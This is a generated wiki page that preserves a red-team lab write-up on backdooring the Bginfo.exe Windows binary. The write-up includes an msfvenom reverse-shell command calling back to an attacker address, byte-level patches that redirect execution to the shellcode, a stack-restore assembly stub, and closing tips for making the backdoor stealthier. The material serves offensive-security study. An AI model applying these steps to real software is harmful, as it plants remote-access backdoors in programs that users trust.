---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Backdooring a PE Executable with Shellcode

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-backdooring-a-pe-executable-with-shellcode` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/backdooring-a-pe-executable-with-shellcode.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Backdooring a PE Executable with Shellcode](../../topics/offensive-security/backdooring-a-pe-executable-with-shellcode.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-backdooring-a-pe-executable-with-shellcode |
| name | Backdooring a PE Executable with Shellcode |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/backdooring-a-pe-executable-with-shellcode.md |

## Preserved Source Material

````yaml
_asset_filenames:
- backdoored-pe.gif
- backdoored-pe2.gif
- backdoored-pe4.gif
- code-redirection.gif
- image (103).png
- image (126).png
- image (22).png
- image (25).png
- image (4).png
- image (40).png
- image (45).png
- image (5).png
- image (58).png
- image (61).png
- image (63).png
- image (71).png
- image (79).png
- image (88).png
- image (91).png
- image (99).png
_body: "# Backdooring a PE Executable with Shellcode\n\n{% hint style=\"info\" %}\nWIP\n{% endhint %}\n\nThe purpose of this\
  \ lab is to learn the PE backdooring technique by adding a new readable/writable/executable .TEXT section section with our\
  \ malicious shellcode.\n\nHigh level process:\n\n* Add a new RWX PE section, big enough to hold our shellcode, to any .exe\
  \ file \n* Generate shellcode\n* Add shellcode to the newly created PE section\n* Redirect execution flow of the .exe file\
  \ being backdoored to the shellcode\n* Redirect execution flow back to the legitimate .exe instructions\n\nThe last two\
  \ steps are a bit more complicated and will have more details below.\n\n## Groundwork\n\n### Generate Shellcode\n\nFirst\
  \ of, let's generate the shellcode so we know how many bytes of space we will need in the new PE section:\n\n```text\nmsfvenom\
  \ -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 | hexdump -C\n```\n\n![](../../.gitbook/assets/image%20%285%29.png)\n\
  \nNote that the shellcode size is 324 bytes - the new PE section will have to be at least that big.\n\n### New PE Code Section\n\
  \nI randomly chose Bginfo.exe from sysinternals as a binary to be backdoored. Let's add a new PE section called `.code1`\
  \ that will contain our shellcode - note the size is 200h bytes, so plenty for our shellcode which was only 324 bytes:\n\
  \n![](../../.gitbook/assets/image%20%2822%29.png)\n\nNote the Raw Address of the new section which is CD200 - this is where\
  \ we will place the shellcode inside the file in later steps.\n\nLet's make the new PE section writable/executable and mark\
  \ it as `contains code` using CFF Explorer:\n\n![](../../.gitbook/assets/image%20%2845%29.png)\n\n### Inserting Shellcode\n\
  \nLet's copy the shellcode over to the new code section, starting at 0xCD200 into the file:\n\n![](../../.gitbook/assets/image%20%2858%29.png)\n\
  \n### Testing the Shellcode\n\nLet's see if we can force the Bginfo.exe binary to execute our shellcode using debugger first.\
  \ We need to find the base address of Bginfo.exe, which we see is 0x00400000:\n\n![](../../.gitbook/assets/image%20%2888%29.png)\n\
  \nSince the new section .code1 that holds our shellcode has an RVA 000D8000, we can find the shellcode in a running process\
  \ at 00400000+00d8000 = ‭4D8000‬. Below shows that the bytes at cd200 \\(file offset\\) match those at 4d8000 while the\
  \ bginfo.exe is running:\n\n![](../../.gitbook/assets/image%20%2879%29.png)\n\nWhen debugging the binary, if we set the\
  \ EIP to point to 4D8000‬ and let the debugger run, if we have a listener on the attacking system, we get the reverse shell\
  \ which confirms that we can successfully execute the shellcode if we manage to redirect the code execution flow of bginfo.exe:\n\
  \n![](../../.gitbook/assets/backdoored-pe.gif)\n\n{% hint style=\"info\" %}\nIn the above screenshot, `pushad` and `pushdf`\
  \ are the first instructions at 4d8000 - it's not shown in this lab how those two instructions were inserted there, but\
  \ there is no magic  - just add   bytes `60 9c` before the shellcode at 0xCD200 in the bginfo and you're set.\n{% endhint\
  \ %}\n\n## Redirecting Code Execution Flow\n\nIn previous paragraph we confirmed the shellcode can be executed, but we did\
  \ this manually, with help of a debugger. Now let's patch the binary, so that the process is automated and does not require\
  \ our intervention.\n\nThe process of patching the binary to redirect the code execution flow is as follows:\n\n1. Find\
  \ the first instruction that is 5 bytes in size inside the bginfo.exe binary \n   1. We will overwrite this instruction\
  \ with a jump to the shellcode as explained in step 2 \n   2. Prior to overwriting this instruction, write it down somewhere\
  \ - we will need to append it to our shellcode later in order to restore the code execution flow\n   3. Write down the address\
  \ of the next instruction to be executed next - after the shellcode has been executed, stack and registers restored, we\
  \ will jump back to this address to let the bginfo.exe continue as normal\n2. Overwrite the instruction in step 1 with a\
  \ jump to the shellcode at 4D8000‬\n3. Save registers' and flags' state by prepending the shellcode with `pushad` and `pushfd`\
  \ instructions - we do this so we can restore their state before redirecting the execution back to bginfo.exe and avoid\
  \ any crashes\n4. Remember the ESP register value - we will need this when calculating by how much the stack size grew during\
  \ the shellcode execution. This is required in order to restore the stack frame before redirecting the code execution back\
  \ to bginfo.exe\n5. Modify the shellcode:\n   1. Make sure that `WaitForSingleObject` does not wait indefinitely and does\
  \ not freeze bginfo.exe once the shellcode is executed\n   2. Remove the last instruction of the shellcode `call ebp` to\
  \ prevent the shellcode from shutting down of bginfo.exe\n6. Note the ESP value and the end of shellcode execution - this\
  \ is related to point 4 and 7 \n7. Restore the stack pointer ESP to what it was after the shellcode executed `pushad` and\
  \ `pushfd` as explained in step 3, with `add esp, <ESP_POST_SHELLCODE - ESP_PRE_SHELLCODE>`. This is where ESPs from point\
  \ 4 and 7 comes in to play\n8. Restore registers with `popfd` and `popad`\n9. Append the shellcode with the instruction\
  \ we had overwritten in step 1\n10. Restore code execution back to bginfo by jumping back to the next instruction after\
  \ the owerwritten one as explained in 1.3\n\n### Overwriting 5 byte Instruction\n\nLet's now hijack the bginfo.exe code\
  \ execution flow by overwriting any instruction that is 5 bytes in size - again - this is how many bytes we need for a `jmp\
  \ address` instruction.\n\nOne of the first 5-byte instructions we can see is `mov edi, bb40e64e` at 00467b29:\n\n{% hint\
  \ style=\"warning\" %}\n**Important**   \nWe are about to overwrite the instruction `mov edi, 0xbb40e64e` at **00467b29**,\
  \ hence we need to remember it for later as explained in 1.2.\n{% endhint %}\n\n![](../../.gitbook/assets/image%20%2825%29.png)\n\
  \nLet's overwrite the instruction at 00467b29 with an instruction `jmp 0x004d8000` which will make the bginfo jump to our\
  \ shellcode located at 0x004d8000 when executed:\n\n![](../../.gitbook/assets/image%20%28126%29.png)\n\n{% hint style=\"\
  warning\" %}\n**Important**  \nRemember the address of the next instruction after **0046b29**, which is **0467b2e** - this\
  \ is the address we will jump back after the shellcode has executed in order to resume bginfo.\n{% endhint %}\n\nThere are\
  \ multiple ways to overwrite the instructions at 00467b29 - either assemble the bytes using a debugger or patch the binary\
  \ via a hex editor which is what I did. I found the bytes `bf 4e e6 40 bb` \\(bytes found at 00467b29 when bginfo is in\
  \ memory\\) in the bginfo.exe \\(screenshot below\\) and replaced them with bytes `e9 d2 04 07 00` which translates to jmp\
  \ `bgfinfo.d48000` \\(jump to our shellcode, above screenshot\\).\n\n![](../../.gitbook/assets/image%20%284%29.png)\n\n\
  Below shows how the code redirection works and we jump to 4d8000 \\(shellcode\\) location once we hit the instruction at\
  \ 00467b29:\n\n![](../../.gitbook/assets/code-redirection.gif)\n\nIf we try running the patched binary now, we can see it\
  \ results in a reverse shell, however the bginfo.exe itself is not visible - we will need to fix that:\n\n![](../../.gitbook/assets/backdoored-pe2.gif)\n\
  \n### Patching Shellcode\n\nThe reason the bginfo.exe is not showing any UI is because the thread is blocked by the shellcode\
  \ call to `WaitForSingleObject` function \\(see definition below\\). It's called with an argument `INFINITE` \\(-1 or 0xFFFFFFFF‬\\\
  ), meaning the thread will be blocked forever.\n\n[`WaitForSingleObject`](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)\
  \ definition:\n\n```cpp\nDWORD WaitForSingleObject(\n  HANDLE hHandle,\n  DWORD  dwMilliseconds\n);\n```\n\nThe below screenshot\
  \ shows that EAX points to `WaitForSingleObject` which is going to be jumped to with `jmp eax` at 004d8081. Note the stack\
  \ - it contains the thread handle \\(28c\\) to block and the wait time FFFFFFFF == INFINITE which is the second argument\
  \ for `WaitForSingleObject`:\n\n![](../../.gitbook/assets/image%20%2899%29.png)\n\nInstruction `dec esi` at 004d811b changes\
  \ ESI value to -1 \\(currently ESI = 0\\), which is the value pushed to the stack as an argument `dwMilliSeconds` for `WaitForSignaledObject`:\n\
  \n![](../../.gitbook/assets/image%20%2861%29.png)\n\nLet's NOP that instruction, so that ESI stays unchanged at 0, which\
  \ means that `WaitForSingleObject` will wait 0 seconds before unblocking the UI:\n\n![](../../.gitbook/assets/image%20%2891%29.png)\n\
  \nNext, we need to patch the `call ebp` instruction at 004d8144 if we don't want the shellcode to close the bginfo.exe process:\n\
  \n![](../../.gitbook/assets/image%20%28103%29.png)\n\nWe will do this by replacing this instruction with an instruction\
  \ that will restore our stack frame pointer ESP to what it was before we started executing our shellcode, but after we executed\
  \ `pushad` and `pushfd` instructions as mentioned in point 7.\n\nFrom earlier, the `ESP` after `pushad` and `pushfd` was\
  \ `0019ff30`:\n\n![](../../.gitbook/assets/image%20%2871%29.png)\n\n`ESP` after executing the shellcode was `0019fd2c`:\n\
  \n![](../../.gitbook/assets/image%20%2863%29.png)\n\nWhich means that the stack grew by 204h bytes:\n\n$$\n0019ff30 - 0019fd2c\
  \ = 0x204\n$$\n\nKnowing all of the above, we need to:\n\n* restore the stack by increasing the ESP by 0x204 bytes\n* restore\
  \ registers and flags with `popfd` and `popad`\n* re-introduce the instruction we previously had overwritten with a jump\
  \ to our shellcode\n* jump back to the next instruction after the overwritten instruction that made the jump to the shellcode\n\
  \nAll the above steps in assembly would be:\n\n```cpp\nadd esp, 0x204\npopfd\npopad\nmov edi, 0xbb40e64e\njmp 0x00467B2E\n\
  ```\n\nThe below screenshot shows the very end of the shellcode with the above instructions encircled:\n\n![](../../.gitbook/assets/image%20%2840%29.png)\n\
  \nIf we save the patched binary and launch it - we can see that the reverse shell gets popped and the bginfo.exe is launched\
  \ successfully:\n\n![](../../.gitbook/assets/backdoored-pe4.gif)\n\n## Final Note\n\nThis technique is not particularly\
  \ stealthy. Rather than adding a new code section to the binary, it's better to attempt locating large spaces of unused\
  \ bytes inside existing code sections, called code caves. To further improve stealthy-ness of this technique, you may want\
  \ to consider encoding/encrypting your shellcode and executing it when user performs certain interaction with the binary\
  \ you are backdooring, for example, invokes Help &gt; About dialog box.\n\n## References\n\n{% embed url=\"https://captmeelo.com/exploitdev/osceprep/2018/07/16/backdoor101-part1.html\"\
  \ %}\n\n{% embed url=\"https://medium.com/@codingkarma/pe-section-header-injection-using-code-cave-1451912d814c\" %}\n\n\
  {% embed url=\"https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/\" %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject\"\
  \ %}"
_relative_path: offensive-security/code-injection-process-injection/backdooring-a-pe-executable-with-shellcode.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/backdooring-a-pe-executable-with-shellcode.md
````
